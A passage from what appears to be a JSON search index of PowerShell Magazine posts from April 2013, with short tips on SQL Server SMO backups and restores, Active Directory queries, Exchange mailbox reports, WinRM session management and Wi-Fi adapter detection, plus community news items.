ANR CN=ANR,CN=Schema,CN=Configuration,DC=domain,DC=com Attribute-Types CN=Attribute-Types,CN=Schema,CN=Configuration,DC=domain,... Canonical-Name CN=Canonical-Name,CN=Schema,CN=Configuration,DC=domain,D... Create-Time-Stamp CN=Create-Time-Stamp,CN=Schema,CN=Configuration,DC=domai... DIT-Content-Rules CN=DIT-Content-Rules,CN=Schema,CN=Configuration,DC=domai... Entry-TTL CN=Entry-TTL,CN=Schema,CN=Configuration,DC=domain,DC=com Extended-Attribute-Info CN=Extended-Attribute-Info,CN=Schema,CN=Configuration,DC... Extended-Class-Info CN=Extended-Class-Info,CN=Schema,CN=Configuration,DC=dom... From-Entry CN=From-Entry,CN=Schema,CN=Configuration,DC=domain,DC=com Modify-Time-Stamp CN=Modify-Time-Stamp,CN=Schema,CN=Configuration,DC=domai... ms-DS-Approx-Immed-Subordinates CN=ms-DS-Approx-Immed-Subordinates,CN=Schema,CN=Configur... ms-DS-Auxiliary-Classes CN=ms-DS-Auxiliary-Classes,CN=Schema,CN=Configuration,DC... ms-DS-isGC CN=ms-DS-isGC,CN=Schema,CN=Configuration,DC=domain,DC=com ms-DS-isRODC CN=ms-DS-isRODC,CN=Schema,CN=Configuration,DC=domain,DC=com ms-DS-Is-User-Cachable-At-Rodc CN=ms-DS-Is-User-Cachable-At-Rodc,CN=Schema,CN=Configura... ms-DS-KeyVersionNumber CN=ms-DS-KeyVersionNumber,CN=Schema,CN=Configuration,DC=... ms-DS-Local-Effective-Deletion-Time CN=ms-DS-Local-Effective-Deletion-Time,CN=Schema,CN=Conf... ms-DS-Local-Effective-Recycle-Time CN=ms-DS-Local-Effective-Recycle-Time,CN=Schema,CN=Confi... ms-DS-NC-Repl-Cursors CN=ms-DS-NC-Repl-Cursors,CN=Schema,CN=Configuration,DC=d... ms-DS-NC-Repl-Inbound-Neighbors CN=ms-DS-NC-Repl-Inbound-Neighbors,CN=Schema,CN=Configur... ms-DS-NC-Repl-Outbound-Neighbors CN=ms-DS-NC-Repl-Outbound-Neighbors,CN=Schema,CN=Configu... ms-DS-Principal-Name CN=ms-DS-Principal-Name,CN=Schema,CN=Configuration,DC=do... ms-DS-Quota-Effective CN=ms-DS-Quota-Effective,CN=Schema,CN=Configuration,DC=d... ms-DS-Quota-Used CN=ms-DS-Quota-Used,CN=Schema,CN=Configuration,DC=domain... ms-DS-Repl-Attribute-Meta-Data CN=ms-DS-Repl-Attribute-Meta-Data,CN=Schema,CN=Configura... ms-DS-Repl-Value-Meta-Data CN=ms-DS-Repl-Value-Meta-Data,CN=Schema,CN=Configuration... ms-DS-Resultant-PSO CN=ms-DS-Resultant-PSO,CN=Schema,CN=Configuration,DC=dom... ms-DS-Revealed-List CN=ms-DS-Revealed-List,CN=Schema,CN=Configuration,DC=dom... ms-DS-Revealed-List-BL CN=ms-DS-Revealed-List-BL,CN=Schema,CN=Configuration,DC=... ms-DS-SiteName CN=ms-DS-SiteName,CN=Schema,CN=Configuration,DC=domain,D... ms-DS-Top-Quota-Usage CN=ms-DS-Top-Quota-Usage,CN=Schema,CN=Configuration,DC=d... ms-DS-User-Account-Control-Computed CN=ms-DS-User-Account-Control-Computed,CN=Schema,CN=Conf... ms-DS-User-Password-Expiry-Time-Computed CN=ms-DS-User-Password-Expiry-Time-Computed,CN=Schema,CN... Object-Classes CN=Object-Classes,CN=Schema,CN=Configuration,DC=domain,D... Parent-GUID CN=Parent-GUID,CN=Schema,CN=Configuration,DC=domain,DC=com Possible-Inferiors CN=Possible-Inferiors,CN=Schema,CN=Configuration,DC=doma... Primary-Group-Token CN=Primary-Group-Token,CN=Schema,CN=Configuration,DC=dom... SD-Rights-Effective CN=SD-Rights-Effective,CN=Schema,CN=Configuration,DC=dom... Structural-Object-Class CN=Structural-Object-Class,CN=Schema,CN=Configuration,DC... SubSchemaSubEntry CN=SubSchemaSubEntry,CN=Schema,CN=Configuration,DC=domai... Token-Groups CN=Token-Groups,CN=Schema,CN=Configuration,DC=domain,DC=com Token-Groups-Global-And-Universal CN=Token-Groups-Global-And-Universal,CN=Schema,CN=Config... Token-Groups-No-GC-Acceptable CN=Token-Groups-No-GC-Acceptable,CN=Schema,CN=Configurat... ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/25/pstip-list-all-active-directory-constructed-attributes/","tags":["Active Directory","Tips and Tricks"],"title":"#PSTip List all Active Directory constructed attributes"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nEver thought about how you can list of all SQL Server instances on the local network? SQL Management Objects (SMO) provides a way to do that. We can use the EnumAvailableSqlServers() Method in the SmoApplication class to achieve this.\nLet us see how:\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\"; [Microsoft.SqlServer.Management.Smo.SmoApplication]::EnumAvailableSqlServers()  There are a couple of other variants of this method.\nWe can use EnumAvailableSqlServers($true) to list only the local SQL Server instances. Using $false as the method argument has the same effect as the above method of listing all instances on the network.\n[Microsoft.SqlServer.Management.Smo.SmoApplication]::EnumAvailableSqlServers($true)  And, EnumAvailableSqlServers(“MyDBServer”) will return SQL instances on the remote server named MyDBServer.\n[Microsoft.SqlServer.Management.Smo.SmoApplication]::EnumAvailableSqlServers(\"MyDBServer\")  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/24/pstip-enumerate-all-sql-server-instances-in-a-network/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Enumerate all SQL Server instances in a network"},{"categories":["Tips and Tricks","Active Directory"],"contents":"There are a few ways to get the site a computer is a member of. In .NET we can use the ActiveDirectorySite class.\n[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Name  This can be extremly usefull if you want to base a script on the value of the computer’s site. Sometimes, however, you’ll want to query the site of remote computer. Unfortunately, the ActiveDirectorySite class doesn’t allow that. One way to get the information is to query the DynamicSiteName registry value of the remote machine. The current site information is cached in the registry of a given machine under (HKLM:\\SYSTEM\\CurrentControlSet\\services\\Netlogon\\Parameters).\nAnother way would be using the nltest command line utility\nPS\u0026gt; nltest /server:server1 /dsgetsite Default-First-Site-Name The command completed successfully  If the command completed successfully, we’ll have the site name in the first line. The last step is to wrap this into a function so we can reuse it later on.\nfunction Get-ComputerSite($ComputerName) { $site = nltest /server:$ComputerName /dsgetsite 2\u0026amp;\u0026gt;$null if($LASTEXITCODE -eq 0){ $site[0] } } PS\u0026gt; Get-ComputerSite server1 Default-First-Site-Name ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/23/pstip-get-the-ad-site-name-of-a-computer/","tags":["Active Directory","Tips and Tricks"],"title":"#PSTip Get the AD site name of a computer"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn today’s tip, we will see how we can use SQL SMO and PowerShell to change the AutoShrink property of a SQL database. This property specifies whether the size of the database is automatically reduced when a large amount of available space occurs. The AutoShrink property takes a Boolean value. So, setting it to $true will enable auto-shrink of the database and $false will disable it.\nLet us see how we can change this.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $database = $server.databases[\"MyDB\"] $database.AutoShrink = $true $database.Alter()  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/22/pstip-changing-sql-database-autoshrink-property-using-smo-and-powershell/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Changing SQL database AutoShrink property using SMO and PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWindows PowerShell allows you to create short names for commands using Aliases. It even allows you to specify short parameter names. Powershell.exe and powershell_ise.exe also have a set of switches to allow you to customize the session of each one, and some of them support short names. The following tables lists those switches and their short version(s) (some have more than one). Note that only switches that have shortcuts are listed.\nPowerShell.exe    meter Shortcut(s)     Command c   EncodedArguments ea,encodeda   EncodedCommand e,ec   ExecutionPolicy ex,ep   File f   Help -h,-? or /h,/?   InputFormat i,if   NoExit noe   NoLogo nol   NoProfile nop   NonInteractive noni   OutputFormat o,of   Sta s   WindowStyle w    powershell_ise.exe    Parameter Shortcut(s)     File f   Help -h,-? or /h,/?   Mta m   NoProfile n    ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/19/pstip-powershell-command-line-switches-shortcuts/","tags":["Tips and Tricks"],"title":"#PSTip PowerShell command-line switch shortcuts"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn a couple of earlier tips on using SMO, we looked at backing up a SQL database and transaction logs. In today’s tip, we will look at how we can perform a database restore using SQL SMO and PowerShell.\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; Add-Type -AssemblyName \u0026quot;Microsoft.SqlServer.SMOExtended, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $restore = new-object Microsoft.SqlServer.Management.Smo.Restore -Property @{ Action = 'database' Database = 'MyDB' ReplaceDatabase = $true NoRecovery = $false } $device = New-Object -TypeName Microsoft.SqlServer.Management.Smo.BackupDeviceItem -ArgumentList \u0026quot;C:\\Intel\\MyDB.bak\u0026quot;,\u0026quot;File\u0026quot; $restore.Devices.Add($device) $restore.SqlRestore($Server) Make a note that this code will restore database to the default SQL data file path. If we need to relocate the files to a different path during restore, we need to follow a different path. Let us save it for another day and another tip! 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/18/pstip-restoring-a-sql-database-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Restoring a SQL Database using SMO"},{"categories":["Tips and Tricks","Exchange"],"contents":"Yesterday I got an email asking for help to create a report of all user mailboxes in Exchange per department. When you execute a Get-Mailbox command, you’ll see that the Department property is not included in the result.\nPS\u0026gt; Get-Mailbox shay | Get-Member d* TypeName: Microsoft.Exchange.Data.Directory.Management.Mailbox Name MemberType Definition ---- ---------- ---------- Database Property Microsoft.Exchange.Data.Directory.ADObjectId Database {get;} DeliverToMailboxAndForward Property bool DeliverToMailboxAndForward {get;set;} DisabledArchiveDatabase Property Microsoft.Exchange.Data.Directory.ADObjectId DisabledArchiveDatabase... DisabledArchiveGuid Property guid DisabledArchiveGuid {get;} DisplayName Property string DisplayName {get;set;} DistinguishedName Property string DistinguishedName {get;} DowngradeHighPriorityMessagesEnabled Property bool DowngradeHighPriorityMessagesEnabled {get;set;} The Department property is a part of the Get-User cmdlet.\nPS\u0026gt; Get-User shay | Format-Table Name,Department -AutoSize Name Department ---- ---------- Shay Levy Computers The most common solution is to invoke the Get-User command for each mailbox object and grab its Department property:\nGet-Mailbox | Select-Object Name,@{n='Department';e={ ($_ |Get-User).Department}}  But that requires executing two cmdlets to get the information. We can generate a quick report of users count per department:\nGet-User -ResultSize Unlimited | Group-Object Department -NoElement  What about mailboxes? You can try and filter the results of the above command to include just user mailboxes using a Where-Object command, but a better way would be to use one of the parameters of the Get-User cmdlet and filter the objects as early as you can.\nGet-User -ResultSize Unlimited -RecipientTypeDetails UserMailbox | Group-Object Department -NoElement | Sort-Object Count -Descending   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/17/pstip-count-the-number-of-mailboxes-per-department/","tags":["Exchange","Tips and Tricks"],"title":"#PSTip Count the number of mailboxes per department"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier tip, we looked at how we can use SQL SMO to perform database backup. In today’s tip, we shall see how we can perform transaction log backup in PowerShell.\nIf you have observed the code in the earlier tip, we used an enumeration called BackupActionType. We can use the same enumeration for performing a transaction log backup.\nLet us see how:\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; Add-Type -AssemblyName \u0026quot;Microsoft.SqlServer.SMOExtended, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $backup = New-Object Microsoft.SqlServer.Management.Smo.Backup -Property @{ Action = [Microsoft.SqlServer.Management.Smo.BackupActionType]::Log BackupSetDescription = \u0026quot;Transaction Log backup of MyDB\u0026quot; BackupSetName = \u0026quot;MyDB TLog backup set\u0026quot; Database = \u0026quot;MyDB\u0026quot; MediaDescription = \u0026quot;Disk\u0026quot; } $backup.Devices.AddDevice(\u0026quot;C:\\Backup\\MyDB-TLog.bak\u0026quot;, 'File') $backup.SqlBackup($server) In the above snippet, Action = [Microsoft.SqlServer.Management.Smo.BackupActionType]::Log is what defines that we want to perform a transaction log backup.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/16/pstip-backing-up-sql-transaction-log-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Backing up SQL transaction log using SMO"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires Windows PowerShell 2.0 or above.\nThe Get-WSManInstance cmdlet can be used to view the sessions that are connected to a remote computer. You can run this cmdlet from any client that’s running PowerShell 2.0 or higher. Getting the number of WinRM sessions by user provides interesting information, especially when you are troubleshooting fan-in scenarios.\nPS\u0026gt; Get-WSManInstance -ConnectionURI http://myserver.mydomain.com:5985/wsman shell -Enumerate rsp : http://schemas.microsoft.com/wbem/wsman/1/windows/shell lang : en-US ShellId : 75A89E0E-E6E5-477D-AD0F-DAD6706CC236 ResourceUri : http://schemas.microsoft.com/powershell Owner : Mydomain\\user1 ClientIP : 192.168.2.11 ProcessId : 5800 IdleTimeOut : PT180.000S InputStreams : stdin pr OutputStreams : stdout BufferMode : Block State : Connected ShellRunTime : P0DT0H17M7S ShellInactivity : P0DT0H0M7S MemoryUsed : 134MB ChildProcesses : 0 rsp : http://schemas.microsoft.com/wbem/wsman/1/windows/shell lang : en-US ShellId : C334FE90-8CA7-4F26-8516-084EF68A2F32 ResourceUri : http://schemas.microsoft.com/powershell Owner : 92.168.2.11 ClientIP : *** ProcessId : 9592 IdleTimeOut : PT180.000S InputStreams : stdin pr OutputStreams : stdout BufferMode : Block State : Connected ShellRunTime : P0DT0H22M25S ShellInactivity : P0DT0H0M24S MemoryUsed : 91MB ChildProcesses : 0 (...) Not only can you see the remote connections, but you can also “kill” connections by using Remove-WSManInstance. In this example, I’m using the command to kill the second session:\nPS\u0026gt; Remove-WSManInstance -ConnectionURI http://myserver.mydomain.com:5985/wsman shell @{ShellID=\"C334FE90-8CA7-4F26-8516-084EF68A2F32\"}  If you want to remove all of the sessions, you can restart the WinRM service, as shown in the next example:\nPS\u0026gt; Restart-Service -Name WinRM  You can find more information about managing remote sessions HERE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/15/pstip-managing-remote-sessions/","tags":["Tips and Tricks"],"title":"#PSTip Managing Remote Sessions"},{"categories":["News"],"contents":"Mark your calendars. Registrations for the 2013 Scripting Games begin on April 22. To get a better understanding of how the games work this year (hosted on PowerShell.org), start by reading the 2013 Competitor’s Guide. If you plan to participate in the games, make sure to read the Instructions for Competitors and Spectators as well. The script submissions will be commentated this year by these expert judges and commentators.\nThe full schedule, for both tracks (beginners and advanced), is available HERE. Be sure to check the Scripting Games Announcement Channel for the most up-to-date information.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/14/2013-powershell-scripting-games/","tags":["News"],"title":"2013 PowerShell Scripting Games"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn today’s tip, we shall see how we can use SQL Management Objects (SMO) in PowerShell to perform a SQL database backup. The Microsoft.SqlServer.Management.Smo.Backup class can be used to achieve this.\nLet us see how:\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" add-type -AssemblyName \"Microsoft.SqlServer.SMOExtended, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName  Once we have the server object, we can perform backup by running the following code snippet.\n$backup = New-Object Microsoft.SqlServer.Management.Smo.Backup -Property @{ Action = [Microsoft.SqlServer.Management.Smo.BackupActionType]::Database BackupSetDescription = \"Full backup of MyDB\" BackupSetName = \"MyDB backup set\" Database = \"MyDB\" MediaDescription = \"Disk\" } $backup.Devices.AddDevice(\"C:\\Backup\\MyDB.bak\", 'File') $backup.SqlBackup($server)  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/12/pstip-backing-up-a-sql-database-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Backing up a SQL database using SMO"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nActive Directory defines five FSMO roles:\n Schema master Domain naming master RID master PDC master Infrastructure master  The first two: schema master and the domain naming master are per-forest roles. There can be only one of each per forest. The other three: RID master, PDC master, and the infrastructure master are per-domain roles. Each domain has its own RID master, PDC master, and infrastructure master.\nThere are numerous ways and tools to help you get the information, including the PowerShell AD module. With the following code, you can get the forest and domain role holders of the current user using PowerShell only.\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object *owner [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest() | Select-Object *owner  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/11/pstip-discovering-active-directory-fsmo-role-holders-using-powershell/","tags":["Tips and Tricks"],"title":"#PSTip Discovering Active Directory FSMO Role Holders using PowerShell"},{"categories":["Tips and Tricks"],"contents":"So, in your script, you need to wait for a service until it reaches a specified status and performs an action based on the new state. One way to achieve this, and an ineffective one, would be to poll the status using a while loop:\n$svc = Get-Service W3SVC while($svc.State -ne 'Stopped') { Start-Sleep -Seconds 1 } ... do your thing here... Instead, you could wait for the service to reach the specified status using one of its native methods:\n$svc.WaitForStatus('Stopped')  This will wait infinitely for the service to reach the specified state, and script execution is halted until the service state changes. Waiting forever for the service to change its state may not be what we want to do, so instead we can use the second overload of the WaitForStatus method and specify an expiration time-out value.\n# wait for 5 seconds $svc.WaitForStatus('Stopped','00:00:05') ... the rest of the script ... ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/10/pstip-wait-for-a-service-to-reach-a-specified-status/","tags":["Tips and Tricks"],"title":"#PSTip Wait for a Service to reach a specified status"},{"categories":["News"],"contents":"Dell released PowerGUI 3.6.0 script editor early this week. With this release, PowerGUI includes full support for Windows PowerShell 3.0 and support for Windows 8 / Windows Server 2012 Operating Systems.\nYou can download this new release on PowerGUI.org. A complete list of changes since the release of PowerGUI 3.0 are available here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/10/powergui-script-editor-gets-full-support-for-powershell-3-0/","tags":["News"],"title":"PowerGUI Script Editor gets full support for PowerShell 3.0"},{"categories":["News"],"contents":"Due to low adoption and usage of the pre-release versions of Script Explorer, Microsoft has decided to take the project down, starting by removing the RC package from the Download Center.\nThe back-end script aggregation service used by Script Explorer will continue to operate for a few more months, allowing users to gradually migrate to another scripts sharing platform.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/09/heads-up-microsoft-script-explorer-reaches-the-end-of-the-road/","tags":["News"],"title":"Heads up: Microsoft Script Explorer reaches the end of the road"},{"categories":["Tips and Tricks"],"contents":"When you assign the result of a service query to a variable, you must take into account one very important thing – the result is just a snapshot of the service state for a specific point in time.\nPS\u0026gt; $svc = Get-Service -Name W3SVC PS\u0026gt; $svc Status Name DisplayName ------ ---- ----------- Running W3SVC World Wide Web Publishing Service Here you can see that the service Status is ‘Running’. However, if the state has been changed outside your script (you can simulate it by stopping the service via the services.msc MMC snap-in), the state of your variable will still show ‘Running’ and your script may fail or perform steps that are not to be run in the current state.\nTo have the most fresh settings of the service before making such descions you can re-query the service, but there’s a better way, use its Refresh method.\n$svc.Refresh()  Calling the Refresh method refreshes the service property values to their current values.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/08/pstip-refreshing-service-objects/","tags":["Tips and Tricks"],"title":"#PSTip Refreshing service objects"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nUsing WMI we can get a list of Wi-Fi adapters with the following command:\nGet-WmiObject -Namespace root\\wmi -Class MSNdis_PhysicalMediumType -Filter \u0026quot;NdisPhysicalMediumType=9 OR NdisPhysicalMediumType=1\u0026quot; I could not find any documentation on the MSNdis_PhysicalMediumType class, but the values of the NdisPhysicalMediumType property maps onto OID_GEN_PHYSICAL_MEDIUM documented here. The integer values of the NdisPhysicalMediumType enum are missing but can be pulled out of the C/C++ header files in the SDK or WDK:\ntypedef enum _NDIS_PHYSICAL_MEDIUM { NdisPhysicalMediumUnspecified, NdisPhysicalMediumWirelessLan, NdisPhysicalMediumCableModem, NdisPhysicalMediumPhoneLine, NdisPhysicalMediumPowerLine, NdisPhysicalMediumDSL, // includes ADSL and UADSL (G.Lite) NdisPhysicalMediumFibreChannel, NdisPhysicalMedium1394, NdisPhysicalMediumWirelessWan, NdisPhysicalMediumNative802_11, NdisPhysicalMediumBluetooth, NdisPhysicalMediumInfiniband, NdisPhysicalMediumWiMax, NdisPhysicalMediumUWB, NdisPhysicalMedium802_3, NdisPhysicalMedium802_5, NdisPhysicalMediumIrda, NdisPhysicalMediumWiredWAN, NdisPhysicalMediumWiredCoWan, NdisPhysicalMediumOther, NdisPhysicalMediumMax // Not a real physical type, defined as an upper-bound } NDIS_PHYSICAL_MEDIUM, *PNDIS_PHYSICAL_MEDIUM; A value of 0 translates to NdisPhysicalMediumUnspecified, 1 to NdisPhysicalMediumWirelessLan, 14 translates to NdisPhysicalMedium802_3, and so on.\nIn Windows 8, this got a lot easier. With the NetAdapter module, we can quickly determine the physical media type of an adapter using the Get-NetAdapter cmdlet.\nPS\u0026gt; Get-NetAdapter | Where-Object PhysicalMediaType -eq 'Native 802.11' Notice that now we use the value of the media type, not the numeric value. The PhysicalMediaType definition shows the mapping:\nPS\u0026gt; (Get-NetAdapter | Get-Member PhysicalMediaType).Definition System.Object PhysicalMediaType {get=$out = switch ($this.NdisPhysicalMedium) { 0 {\u0026quot;Unspecified\u0026quot;} 1 {\u0026quot;Wireless LAN\u0026quot;} 2 {\u0026quot;Cable Modem\u0026quot;} 8 {\u0026quot;Wireless WAN\u0026quot;} 9 {\u0026quot;Native 802.11\u0026quot;} 10 {\u0026quot;BlueTooth\u0026quot;} 11 {\u0026quot;Infiniband\u0026quot;} 12 {\u0026quot;WiMAX\u0026quot;} 13 {\u0026quot;UWB\u0026quot;} 14 {\u0026quot;802.3\u0026quot;} 16 {\u0026quot;IRDA\u0026quot;} 17 {\u0026quot;Wired WAN\u0026quot;} 18 {\u0026quot;Wired Connection Oriented WAN\u0026quot;} 19 {\u0026quot;Other\u0026quot;} default {\u0026quot;Unknown\u0026quot;} } $out;} Depending on your environment, you could also use this command to cover all Wi-Fi media types:\nGet-NetAdapter | Where-Object {$_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN' -or 'Wireless WAN\u0026quot; } Lastly, here\u0026rsquo;s a valuable piece of information you might want to consider when you query Wireless adapters:\n Native 802.11: Most WiFi drivers Wireless LAN : Very old WiFi drivers Wireless WAN : Some 3G/4G mobile broadband adapters (not all)  The latest Windows 8 telemetry shows that approximately 0.2% of WiFi adapters are of the very old variety.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/04/pstip-detecting-wi-fi-adapters/","tags":["Tips and Tricks"],"title":"#PSTip Detecting Wi-Fi adapters"},{"categories":["News"],"contents":"The MMS 2013 conference starts next week. The keynote and sessions will be available for replay through the Channel 9 web site. Channel 9 has unveiled their MMS 2013 page including an RSS feed. We can use the RSS feed and PowerShell to easily browse the session catalog.\nThe following command uses the Invoke-RestMethod cmdlet, introduced in Windows PowerShell 3.0, to get information from the MMS 2013 RSS feed. We select a few properties and pass them on to the Out-GridView cmdlet. In a grid view, we can perform further filtering (picking up only sessions where a summary contains the word “powershell”, for example), select the sessions we are interested in, and, thanks to a new -PassThru parameter, pipe them to the Export-Csv cmdlet.\nPS\u0026gt; $rss = 'http://channel9.msdn.com/Events/MMS/2013/RSS' PS\u0026gt; Invoke-RestMethod -Uri $rss | select Title, Creator, Summary, Link | Out-GridView -PassThru | Export-Csv -Path c:\\temp\\mms2013.csv -Encoding UTF8  This is how the grid view looks like after filtering PowerShell-related sessions (click for larger image):\nNow that we have our sessions exported to a CSV file, we can import the file, and look at the details of some specific session that we are interested in:\nPS\u0026gt; Import-Csv c:\\temp\\mms2013.csv | where title -match 'azure' | fl * title : Take Control of the Cloud with the Windows Azure PowerShell Cmdlets creator : Michael Washam summary : In this session you will learn how to tame the simplest to most advanced Windows Azure deployments with the Windows Azure PowerShell cmdlets. Automate repetitive tasks and learn how build advanced reproducible deployments so you can save time and money while working in the cloud. The presenter will cover dev-ops scenarios with Virtual Machines and Cloud Services in this demo packed session. link : http://channel9.msdn.com/Events/MMS/2013/WS-B311 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/03/channel-9s-mms-2013-rss-feed-is-more-fun-with-powershell/","tags":["News"],"title":"Channel 9’s MMS 2013 RSS feed is more fun with PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen automating SQL server database creation in PowerShell, we may want to give the end user an option to select from a list of available fixed disk drives and let the user select the drive that should be used for database file creation, etc. It is preferred here to see what drives can be seen by the SQL server instance. We can do this using the EnumAvailableMedia() method in SQL SMO. A variant of this method takes MediaType as an argument. Within this enumeration, a value ‘2’ represents fixed disk.\nLet us see how to use this in PowerShell:\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $server.EnumAvailableMedia(2)  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/03/pstip-list-all-fixed-disk-drives-visible-to-sql-server-instance/","tags":["Tips and Tricks","SQL"],"title":"#PSTip List all fixed disk drives visible to SQL Server instance"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nAs database administrators, we might want to configure SQL MaxServerMemory setting to ensure the SQL service does not occupy all available physical memory. This setting can be changed using SMO and PowerShell.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $server.Configuration.MaxServerMemory.ConfigValue = 16384 $server.Configuration.Alter()  Make a note that the value of MaxServerMemory is in megabytes (MB).\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/03/pstip-change-sql-server-maxservermemory-configuration-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Change SQL Server MaxServerMemory configuration using SMO"},{"categories":["News"],"contents":"We are pleased to announce that we have teamed up with Packt Publishing again and are organizing a giveaway especially for you. All you need to do is post your #PSTip draft in the Comments section below this post. Three lucky winners stand a chance to win a free copy of Oracle Database and PowerShell How-to eBook.\nOverview of Oracle Database and PowerShell How-to • Load Oracle Data Access components and connect to Oracle databases\n• Retrieve, format, filter, and export data\n• Execute database procedures and modify database objects\n• Build Oracle script libraries and run automated, unattended scripts.\nHow to Enter? Write a #PSTip and post it in the Comments section below. You don’t need to write a complete blog post, just a draft. You can submit more than one tip. The readers are encouraged to vote for submitted entries and help us pick up the winners. And remember, you could be one of the 3 lucky participants to win the eBook and get published in PowerShell Magazine! Isn’t that brilliant? It doesn’t matter if you post a tip for beginners or a super-advanced tip. Everything counts!\nDeadLine: The contest will close on Saturday, April 6, 2013. We’ll announce the winners on Monday, April 8, 2013.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/02/write-a-pstip-and-win-a-copy-of-packts-oracle-database-and-powershell-how-to-ebook/","tags":["News"],"title":"Write a #PSTip and win a copy of Packt’s Oracle Database and PowerShell How-to eBook"},{"categories":["Tips and Tricks","WMI"],"contents":"Note: This tip requires admin privileges (elevated shell)\nTo get Resultant Set of Policy (RSOP) data we usually RSOP.mmc or the gpresult command line tool. But we can also use WMI to retrieve the settings. Under the covers, the RSOP MMC snap-in calls WMI to create RSOP data. The data (snapshot) is created under temporary namespaces that are generated dynamically. For example, to get a list of user namespaces (partial result):\nPS\u0026gt; Get-WmiObject -Namespace root\\rsop\\user -Class __NAMESPACE __GENUS : 2 __CLASS : __NAMESPACE __SUPERCLASS : __SystemClass __DYNASTY : __SystemClass __RELPATH : __NAMESPACE.Name=\u0026quot;S_1_5_21_1265342080_1232889825_337633078_123\u0026quot; __PROPERTY_COUNT : 1 __DERIVATION : {__SystemClass} __SERVER : SHAY 